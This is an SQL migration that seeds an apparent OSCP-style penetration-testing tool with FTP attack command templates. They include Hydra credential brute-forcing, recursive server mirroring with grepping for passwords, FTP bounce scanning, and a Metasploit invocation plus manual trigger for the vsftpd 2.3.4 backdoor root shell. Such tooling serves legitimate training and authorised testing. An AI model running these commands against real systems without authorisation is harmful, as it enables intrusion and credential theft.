-- Migration 003: FTP Plugin Command Definitions (CORRECTED)
-- Populates commands and task templates for FTP service plugin
-- SCHEMA-ALIGNED with actual database structure
--
-- Date: 2025-10-28
-- Plugin: ftp (21/tcp)
-- Commands: 8 core FTP enumeration commands
--
-- Tables populated:
--   - variables (common placeholders)
--   - commands (command definitions)
--   - command_vars (command-variable links)
--   - command_flags (flag explanations)
--   - command_indicators (success/failure patterns)
--   - command_tags (tag assignments)
--   - plugin_task_templates (task definitions)

BEGIN TRANSACTION;

-- =============================================================================
-- Step 1: Ensure Common Variables Exist
-- =============================================================================

INSERT INTO variables (name, description, data_type, default_value, source)
VALUES
    ('<TARGET>', 'Target IP address or hostname', 'ip', NULL, 'user'),
    ('<PORT>', 'Service port number', 'port', NULL, 'user'),
    ('<LHOST>', 'Local attacker IP (for reverse shells, listeners)', 'ip', NULL, 'config'),
    ('<LPORT>', 'Local attacker port (for reverse shells, listeners)', 'port', '4444', 'config')
ON CONFLICT (name) DO UPDATE SET
    description = EXCLUDED.description,
    data_type = EXCLUDED.data_type,
    default_value = EXCLUDED.default_value,
    source = EXCLUDED.source
WHERE (
    variables.description IS DISTINCT FROM EXCLUDED.description OR
    variables.data_type IS DISTINCT FROM EXCLUDED.data_type OR
    variables.default_value IS DISTINCT FROM EXCLUDED.default_value OR
    variables.source IS DISTINCT FROM EXCLUDED.source
);

-- =============================================================================
-- Step 2: Insert FTP Commands (8 commands)
-- =============================================================================

-- Command 1: FTP Banner Grabbing
INSERT INTO commands (
    id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
) VALUES (
    'ftp-banner-grab',
    'FTP Banner Grabbing',
    'nc -vn <TARGET> <PORT>',
    'Grab FTP banner to identify service version and check if FTP is running',
    'recon',
    'ftp',
    'high',
    'FTP banners often leak useful version info. Time: ~10 seconds. Manual alternative: telnet <TARGET> <PORT>'
)
ON CONFLICT (id) DO UPDATE SET
    name = EXCLUDED.name,
    command_template = EXCLUDED.command_template,
    description = EXCLUDED.description,
    category = EXCLUDED.category,
    subcategory = EXCLUDED.subcategory,
    oscp_relevance = EXCLUDED.oscp_relevance,
    notes = EXCLUDED.notes
WHERE (
    commands.name IS DISTINCT FROM EXCLUDED.name OR
    commands.command_template IS DISTINCT FROM EXCLUDED.command_template OR
    commands.description IS DISTINCT FROM EXCLUDED.description OR
    commands.category IS DISTINCT FROM EXCLUDED.category OR
    commands.subcategory IS DISTINCT FROM EXCLUDED.subcategory OR
    commands.oscp_relevance IS DISTINCT FROM EXCLUDED.oscp_relevance OR
    commands.notes IS DISTINCT FROM EXCLUDED.notes
);

-- Link variables
INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('ftp-banner-grab', (SELECT id FROM variables WHERE name = '<TARGET>'), 1, TRUE, '192.168.1.100'),
    ('ftp-banner-grab', (SELECT id FROM variables WHERE name = '<PORT>'), 2, TRUE, '21') ON CONFLICT (command_id, variable_id) DO NOTHING;

-- Add flags
INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('ftp-banner-grab', '-v', 'Verbose output (show connection details)'),
    ('ftp-banner-grab', '-n', 'No DNS resolution (faster, direct IP connection)') ON CONFLICT (command_id, flag) DO NOTHING;

-- Add indicators
INSERT INTO command_indicators (command_id, indicator_type, pattern, pattern_type, description)
VALUES
    ('ftp-banner-grab', 'success', '220', 'literal', 'FTP banner displayed (220 response code)'),
    ('ftp-banner-grab', 'success', 'FTP', 'literal', 'FTP service identified in banner'),
    ('ftp-banner-grab', 'failure', 'Connection refused', 'literal', 'Port closed or firewall blocking'),
    ('ftp-banner-grab', 'failure', 'timeout', 'literal', 'Host unreachable or no response') ON CONFLICT DO NOTHING;

-- Add tags
INSERT INTO tags (name) VALUES ('OSCP:HIGH'), ('OSCP:MEDIUM'), ('OSCP:LOW'), ('QUICK_WIN'), ('MANUAL')
ON CONFLICT (name) DO UPDATE SET
    category = EXCLUDED.category,
    description = EXCLUDED.description,
    color = EXCLUDED.color
WHERE (
    tags.category IS DISTINCT FROM EXCLUDED.category OR
    tags.description IS DISTINCT FROM EXCLUDED.description OR
    tags.color IS DISTINCT FROM EXCLUDED.color
);
INSERT INTO command_tags (command_id, tag_id) VALUES
    ('ftp-banner-grab', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('ftp-banner-grab', (SELECT id FROM tags WHERE name = 'QUICK_WIN')),
    ('ftp-banner-grab', (SELECT id FROM tags WHERE name = 'MANUAL')) ON CONFLICT (command_id, tag_id) DO NOTHING;

-- =============================================================================

-- Command 2: Anonymous FTP Access Test
INSERT INTO commands (
    id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
) VALUES (
    'ftp-anon-test',
    'FTP Anonymous Access Test',
    'nmap --script ftp-anon -p<PORT> <TARGET>',
    'Test for anonymous FTP login (username: anonymous, password: anonymous or blank)',
    'recon',
    'ftp',
    'high',
    'Anonymous FTP still common in legacy systems. Often a QUICK WIN. Time: ~30 seconds. Manual: ftp <TARGET>, login as anonymous/anonymous'
)
ON CONFLICT (id) DO UPDATE SET
    name = EXCLUDED.name,
    command_template = EXCLUDED.command_template,
    description = EXCLUDED.description,
    category = EXCLUDED.category,
    subcategory = EXCLUDED.subcategory,
    oscp_relevance = EXCLUDED.oscp_relevance,
    notes = EXCLUDED.notes
WHERE (
    commands.name IS DISTINCT FROM EXCLUDED.name OR
    commands.command_template IS DISTINCT FROM EXCLUDED.command_template OR
    commands.description IS DISTINCT FROM EXCLUDED.description OR
    commands.category IS DISTINCT FROM EXCLUDED.category OR
    commands.subcategory IS DISTINCT FROM EXCLUDED.subcategory OR
    commands.oscp_relevance IS DISTINCT FROM EXCLUDED.oscp_relevance OR
    commands.notes IS DISTINCT FROM EXCLUDED.notes
);

INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('ftp-anon-test', (SELECT id FROM variables WHERE name = '<TARGET>'), 2, TRUE, '192.168.1.100'),
    ('ftp-anon-test', (SELECT id FROM variables WHERE name = '<PORT>'), 1, TRUE, '21') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('ftp-anon-test', '--script ftp-anon', 'NSE script to test anonymous FTP access and list directory contents'),
    ('ftp-anon-test', '-p', 'Target port') ON CONFLICT (command_id, flag) DO NOTHING;

INSERT INTO command_indicators (command_id, indicator_type, pattern, pattern_type, description)
VALUES
    ('ftp-anon-test', 'success', 'Anonymous FTP login allowed', 'literal', 'Anonymous access successful'),
    ('ftp-anon-test', 'success', '230 Login successful', 'literal', 'Login OK response code'),
    ('ftp-anon-test', 'failure', '530 Login incorrect', 'literal', 'Anonymous access denied'),
    ('ftp-anon-test', 'failure', '530 Anonymous access denied', 'literal', 'Explicit denial of anonymous access') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('ftp-anon-test', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('ftp-anon-test', (SELECT id FROM tags WHERE name = 'QUICK_WIN')) ON CONFLICT (command_id, tag_id) DO NOTHING;

-- =============================================================================

-- Command 3: FTP NSE Scripts Scan
INSERT INTO commands (
    id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
) VALUES (
    'ftp-nmap-scripts',
    'FTP Nmap NSE Scripts',
    'nmap --script ftp-* -p<PORT> <TARGET>',
    'Run all FTP NSE scripts (anonymous login, bounce attack, brute-force, backdoor detection)',
    'recon',
    'ftp',
    'high',
    'Comprehensive but noisy. Includes ftp-anon, ftp-bounce, ftp-brute, ftp-proftpd-backdoor, ftp-vsftpd-backdoor. Time: 2-5 minutes'
)
ON CONFLICT (id) DO UPDATE SET
    name = EXCLUDED.name,
    command_template = EXCLUDED.command_template,
    description = EXCLUDED.description,
    category = EXCLUDED.category,
    subcategory = EXCLUDED.subcategory,
    oscp_relevance = EXCLUDED.oscp_relevance,
    notes = EXCLUDED.notes
WHERE (
    commands.name IS DISTINCT FROM EXCLUDED.name OR
    commands.command_template IS DISTINCT FROM EXCLUDED.command_template OR
    commands.description IS DISTINCT FROM EXCLUDED.description OR
    commands.category IS DISTINCT FROM EXCLUDED.category OR
    commands.subcategory IS DISTINCT FROM EXCLUDED.subcategory OR
    commands.oscp_relevance IS DISTINCT FROM EXCLUDED.oscp_relevance OR
    commands.notes IS DISTINCT FROM EXCLUDED.notes
);

INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('ftp-nmap-scripts', (SELECT id FROM variables WHERE name = '<TARGET>'), 2, TRUE, '192.168.1.100'),
    ('ftp-nmap-scripts', (SELECT id FROM variables WHERE name = '<PORT>'), 1, TRUE, '21') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('ftp-nmap-scripts', '--script ftp-*', 'Run all NSE scripts matching "ftp-*" pattern (wildcard)'),
    ('ftp-nmap-scripts', '-p', 'Target port') ON CONFLICT (command_id, flag) DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('ftp-nmap-scripts', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')) ON CONFLICT (command_id, tag_id) DO NOTHING;

-- =============================================================================

-- Command 4: FTP Recursive Download
INSERT INTO commands (
    id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
) VALUES (
    'ftp-wget-mirror',
    'FTP Recursive Download',
    'wget -m ftp://anonymous:anonymous@<TARGET>',
    'Download ALL files recursively from FTP server (mirror mode)',
    'recon',
    'ftp',
    'high',
    'Requires anonymous or valid credentials. Time: 1-30 minutes depending on size. Use --no-passive if PASV fails. Then grep for passwords: grep -r "password" .'
)
ON CONFLICT (id) DO UPDATE SET
    name = EXCLUDED.name,
    command_template = EXCLUDED.command_template,
    description = EXCLUDED.description,
    category = EXCLUDED.category,
    subcategory = EXCLUDED.subcategory,
    oscp_relevance = EXCLUDED.oscp_relevance,
    notes = EXCLUDED.notes
WHERE (
    commands.name IS DISTINCT FROM EXCLUDED.name OR
    commands.command_template IS DISTINCT FROM EXCLUDED.command_template OR
    commands.description IS DISTINCT FROM EXCLUDED.description OR
    commands.category IS DISTINCT FROM EXCLUDED.category OR
    commands.subcategory IS DISTINCT FROM EXCLUDED.subcategory OR
    commands.oscp_relevance IS DISTINCT FROM EXCLUDED.oscp_relevance OR
    commands.notes IS DISTINCT FROM EXCLUDED.notes
);

INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('ftp-wget-mirror', (SELECT id FROM variables WHERE name = '<TARGET>'), 1, TRUE, '192.168.1.100') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('ftp-wget-mirror', '-m', 'Mirror mode (recursive download with infinite depth, preserves timestamps)') ON CONFLICT (command_id, flag) DO NOTHING;

INSERT INTO command_indicators (command_id, indicator_type, pattern, pattern_type, description)
VALUES
    ('ftp-wget-mirror', 'success', 'Downloaded:', 'literal', 'Files successfully downloaded'),
    ('ftp-wget-mirror', 'success', 'saved', 'literal', 'Files saved to disk'),
    ('ftp-wget-mirror', 'failure', 'Authentication failed', 'literal', 'Invalid credentials'),
    ('ftp-wget-mirror', 'failure', 'Passive mode', 'literal', 'PASV mode error - use --no-passive flag') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('ftp-wget-mirror', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')) ON CONFLICT (command_id, tag_id) DO NOTHING;

-- =============================================================================

-- Command 5: FTP Default Credentials Test
INSERT INTO commands (
    id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
) VALUES (
    'ftp-hydra-defaults',
    'FTP Default Credentials Test',
    'hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <TARGET> ftp',
    'Test common default FTP credentials (admin:admin, root:root, ftp:ftp) - QUICK WIN before full brute-force',
    'exploitation',
    'ftp',
    'high',
    'SecLists has 64 FTP default creds. Try this BEFORE full brute-force. Time: 1-2 minutes. Wordlist format: user:pass per line'
)
ON CONFLICT (id) DO UPDATE SET
    name = EXCLUDED.name,
    command_template = EXCLUDED.command_template,
    description = EXCLUDED.description,
    category = EXCLUDED.category,
    subcategory = EXCLUDED.subcategory,
    oscp_relevance = EXCLUDED.oscp_relevance,
    notes = EXCLUDED.notes
WHERE (
    commands.name IS DISTINCT FROM EXCLUDED.name OR
    commands.command_template IS DISTINCT FROM EXCLUDED.command_template OR
    commands.description IS DISTINCT FROM EXCLUDED.description OR
    commands.category IS DISTINCT FROM EXCLUDED.category OR
    commands.subcategory IS DISTINCT FROM EXCLUDED.subcategory OR
    commands.oscp_relevance IS DISTINCT FROM EXCLUDED.oscp_relevance OR
    commands.notes IS DISTINCT FROM EXCLUDED.notes
);

INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('ftp-hydra-defaults', (SELECT id FROM variables WHERE name = '<TARGET>'), 1, TRUE, '192.168.1.100') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('ftp-hydra-defaults', '-C', 'Colon-separated username:password list (format: user:pass per line)') ON CONFLICT (command_id, flag) DO NOTHING;

INSERT INTO command_indicators (command_id, indicator_type, pattern, pattern_type, description)
VALUES
    ('ftp-hydra-defaults', 'success', '[21][ftp]', 'literal', 'Valid credentials found (Hydra output format)'),
    ('ftp-hydra-defaults', 'success', 'login:', 'literal', 'Successful authentication'),
    ('ftp-hydra-defaults', 'failure', 'All attempts failed', 'literal', 'No default credentials work') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('ftp-hydra-defaults', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('ftp-hydra-defaults', (SELECT id FROM tags WHERE name = 'QUICK_WIN')) ON CONFLICT (command_id, tag_id) DO NOTHING;

-- =============================================================================

-- Command 6: FTP Brute Force
INSERT INTO commands (
    id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
) VALUES (
    'ftp-hydra-brute',
    'FTP Credential Brute Force',
    'hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<TARGET>',
    'Full credential brute-force with wordlists (SLOW, NOISY - use only if other methods fail)',
    'exploitation',
    'ftp',
    'low',
    'FTP brute-force is SLOW (plain text, sequential). Use small wordlists for OSCP. Time: 30+ minutes. Can trigger account lockout. Try -t 16 for faster (but noisier) scanning'
)
ON CONFLICT (id) DO UPDATE SET
    name = EXCLUDED.name,
    command_template = EXCLUDED.command_template,
    description = EXCLUDED.description,
    category = EXCLUDED.category,
    subcategory = EXCLUDED.subcategory,
    oscp_relevance = EXCLUDED.oscp_relevance,
    notes = EXCLUDED.notes
WHERE (
    commands.name IS DISTINCT FROM EXCLUDED.name OR
    commands.command_template IS DISTINCT FROM EXCLUDED.command_template OR
    commands.description IS DISTINCT FROM EXCLUDED.description OR
    commands.category IS DISTINCT FROM EXCLUDED.category OR
    commands.subcategory IS DISTINCT FROM EXCLUDED.subcategory OR
    commands.oscp_relevance IS DISTINCT FROM EXCLUDED.oscp_relevance OR
    commands.notes IS DISTINCT FROM EXCLUDED.notes
);

INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('ftp-hydra-brute', (SELECT id FROM variables WHERE name = '<TARGET>'), 1, TRUE, '192.168.1.100') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('ftp-hydra-brute', '-L', 'Username wordlist (file with one username per line)'),
    ('ftp-hydra-brute', '-P', 'Password wordlist (rockyou.txt = 14 million passwords)'),
    ('ftp-hydra-brute', '-t', 'Parallel tasks/threads (4 = safe/slow, 16 = aggressive/noisy)') ON CONFLICT (command_id, flag) DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('ftp-hydra-brute', (SELECT id FROM tags WHERE name = 'OSCP:LOW')) ON CONFLICT (command_id, tag_id) DO NOTHING;

-- =============================================================================

-- Command 7: FTP Bounce Attack Detection
INSERT INTO commands (
    id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
) VALUES (
    'ftp-bounce-scan',
    'FTP Bounce Attack Detection',
    'nmap -Pn -v -p 21,80 -b anonymous:anonymous@<TARGET> 127.0.0.1',
    'Test if FTP server allows PORT command (bounce attack) to scan other hosts/ports',
    'exploitation',
    'ftp',
    'medium',
    'FTP bounce attacks are RARE on modern servers (PORT command disabled). Allows scanning internal networks, bypassing firewalls. Time: 2-5 minutes'
)
ON CONFLICT (id) DO UPDATE SET
    name = EXCLUDED.name,
    command_template = EXCLUDED.command_template,
    description = EXCLUDED.description,
    category = EXCLUDED.category,
    subcategory = EXCLUDED.subcategory,
    oscp_relevance = EXCLUDED.oscp_relevance,
    notes = EXCLUDED.notes
WHERE (
    commands.name IS DISTINCT FROM EXCLUDED.name OR
    commands.command_template IS DISTINCT FROM EXCLUDED.command_template OR
    commands.description IS DISTINCT FROM EXCLUDED.description OR
    commands.category IS DISTINCT FROM EXCLUDED.category OR
    commands.subcategory IS DISTINCT FROM EXCLUDED.subcategory OR
    commands.oscp_relevance IS DISTINCT FROM EXCLUDED.oscp_relevance OR
    commands.notes IS DISTINCT FROM EXCLUDED.notes
);

INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('ftp-bounce-scan', (SELECT id FROM variables WHERE name = '<TARGET>'), 1, TRUE, '192.168.1.100') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('ftp-bounce-scan', '-Pn', 'No ping (treat host as online)'),
    ('ftp-bounce-scan', '-v', 'Verbose output'),
    ('ftp-bounce-scan', '-b', 'Bounce scan through FTP server (uses FTP server as proxy)'),
    ('ftp-bounce-scan', '-p', 'Ports to scan on target (via FTP bounce)') ON CONFLICT (command_id, flag) DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('ftp-bounce-scan', (SELECT id FROM tags WHERE name = 'OSCP:MEDIUM')) ON CONFLICT (command_id, tag_id) DO NOTHING;

-- =============================================================================

-- Command 8: vsftpd 2.3.4 Backdoor Exploit
INSERT INTO commands (
    id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
) VALUES (
    'vsftpd-backdoor-msf',
    'vsftpd 2.3.4 Backdoor Exploit',
    'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST <TARGET>; set RPORT <PORT>; exploit"',
    'Exploit vsftpd 2.3.4 backdoor (smiley face backdoor) - INSTANT ROOT SHELL',
    'exploitation',
    'ftp',
    'high',
    'Backdoor intentionally inserted in vsftpd 2.3.4 (2011). Login with ":)" triggers backdoor on port 6200. Famous in OSCP labs. Manual: telnet <TARGET> 21, USER backdoored:), PASS anything, then nc <TARGET> 6200. Time: 30 seconds - 1 minute'
);

INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('vsftpd-backdoor-msf', (SELECT id FROM variables WHERE name = '<TARGET>'), 1, TRUE, '192.168.1.100'),
    ('vsftpd-backdoor-msf', (SELECT id FROM variables WHERE name = '<PORT>'), 2, TRUE, '21') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('vsftpd-backdoor-msf', '-q', 'Quiet mode (suppress Metasploit banner)'),
    ('vsftpd-backdoor-msf', '-x', 'Execute commands after msfconsole startup, then exit') ON CONFLICT (command_id, flag) DO NOTHING;

INSERT INTO command_indicators (command_id, indicator_type, pattern, pattern_type, description)
VALUES
    ('vsftpd-backdoor-msf', 'success', 'Command shell session opened', 'literal', 'Exploit successful - shell obtained'),
    ('vsftpd-backdoor-msf', 'success', 'uid=0', 'literal', 'Root shell obtained'),
    ('vsftpd-backdoor-msf', 'failure', 'Exploit failed', 'literal', 'Backdoor not present (patched or clean build)'),
    ('vsftpd-backdoor-msf', 'failure', 'Connection refused on port 6200', 'literal', 'Backdoor port 6200 not opening') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('vsftpd-backdoor-msf', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('vsftpd-backdoor-msf', (SELECT id FROM tags WHERE name = 'QUICK_WIN')) ON CONFLICT (command_id, tag_id) DO NOTHING;

-- =============================================================================
-- Step 3: Insert FTP Plugin Task Templates (8 tasks)
-- =============================================================================

-- Task 1: Banner Grabbing
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-banner',
    'Banner Grabbing',
    'command',
    'ftp-banner-grab',
    1,
    'Grab FTP banner to identify service version',
    '["OSCP:HIGH", "QUICK_WIN", "MANUAL"]'
) ON CONFLICT DO NOTHING;

-- Task 2: Anonymous Access Test
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-anon',
    'Anonymous Access Test',
    'command',
    'ftp-anon-test',
    2,
    'Test for anonymous FTP login',
    '["OSCP:HIGH", "QUICK_WIN"]'
) ON CONFLICT DO NOTHING;

-- Task 3: FTP NSE Scripts
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-scripts',
    'Automated FTP Script Scan',
    'command',
    'ftp-nmap-scripts',
    3,
    'Run all FTP NSE scripts',
    '["OSCP:HIGH", "AUTOMATED"]'
) ON CONFLICT DO NOTHING;

-- Task 4: File Download
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-download',
    'Recursive File Download',
    'command',
    'ftp-wget-mirror',
    4,
    'Download all files from FTP server',
    '["OSCP:HIGH", "AUTOMATED"]'
) ON CONFLICT DO NOTHING;

-- Task 5: Default Credentials
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-default-creds',
    'Test Default Credentials',
    'command',
    'ftp-hydra-defaults',
    5,
    'Test common default FTP credentials',
    '["OSCP:HIGH", "QUICK_WIN"]'
) ON CONFLICT DO NOTHING;

-- Task 6: vsftpd Backdoor (high value, before brute force)
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'vsftpd-backdoor',
    'vsftpd 2.3.4 Backdoor Exploit',
    'command',
    'vsftpd-backdoor-msf',
    6,
    'Exploit vsftpd 2.3.4 backdoor for root shell',
    '["OSCP:HIGH", "EXPLOIT", "QUICK_WIN"]'
) ON CONFLICT DO NOTHING;

-- Task 7: Bounce Attack (medium priority)
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-bounce',
    'FTP Bounce Attack Detection',
    'command',
    'ftp-bounce-scan',
    7,
    'Test FTP bounce attack capability',
    '["OSCP:MEDIUM", "ADVANCED"]'
) ON CONFLICT DO NOTHING;

-- Task 8: Brute Force (lowest priority - slow and noisy)
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-bruteforce',
    'Full Credential Brute-force',
    'command',
    'ftp-hydra-brute',
    10,
    'Full credential brute-force with wordlists',
    '["OSCP:LOW", "AUTOMATED", "NOISY"]'
) ON CONFLICT DO NOTHING;

COMMIT;

-- =============================================================================
-- Validation Queries
-- =============================================================================

-- Check FTP commands
-- SELECT COUNT(*) FROM commands WHERE subcategory = 'ftp';
-- Expected: 8

-- Check FTP task templates
-- SELECT COUNT(*) FROM plugin_task_templates
-- WHERE plugin_id = (SELECT id FROM service_plugins WHERE name = 'ftp');
-- Expected: 8

-- View FTP plugin tasks with commands
-- SELECT
--     t.priority,
--     t.task_id,
--     t.task_name,
--     c.name as command_name,
--     c.command_template
-- FROM plugin_task_templates t
-- LEFT JOIN commands c ON t.command_id = c.id
-- WHERE t.plugin_id = (SELECT id FROM service_plugins WHERE name = 'ftp')
-- ORDER BY t.priority;

-- Test task instance creation
-- python3 -c "
-- from db.repositories import PluginRepository
-- repo = PluginRepository()
-- instance = repo.create_task_instance('ftp', '192.168.1.100', 21, {'service': 'ftp'})
-- import json
-- print(json.dumps(instance, indent=2))
-- "
